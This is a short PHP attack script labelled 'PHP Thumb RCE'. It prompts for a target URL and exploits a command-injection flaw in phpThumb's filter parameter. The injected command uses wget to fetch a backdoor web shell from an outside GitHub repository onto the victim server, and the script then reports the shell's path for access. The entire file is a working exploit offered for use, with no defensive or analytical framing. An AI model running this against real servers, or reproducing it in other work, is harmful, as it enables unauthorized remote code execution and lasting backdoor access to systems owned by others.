<?php

    echo "#################################\n";
    echo "#         PHP Thumb RCE         #\n";
    echo "#  MarsHall - In Crush We Rush  #\n";
    echo "#################################\n";
    echo "Target : ";
    $target = trim(fgets(STDIN));

    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_URL, "$target?src=file.jpg&fltr[]=blur|9%20-quality%2075%20-interlace%20line%20fail.jpg%20jpeg:fail.jpg;wget%20-S%20https://raw.githubusercontent.com/MarsHallGans/Shell-Backdoor/master/plod.php;rm%20plod.php.1;&phpThumbDebug=9");
    curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Linux; Android 5.0.2; Redmi Note 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Mobile Safari/537.36');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    $output = curl_exec($ch); 
    $err = curl_error($ch);
    curl_close($ch);
    
    if ($output) {
    echo "\n\nNot Vuln $err\n";
    } else {
    echo "\n\nVuln : $target\nAkses Shell : ../phpthumb/plod.php\n";
    }
?>
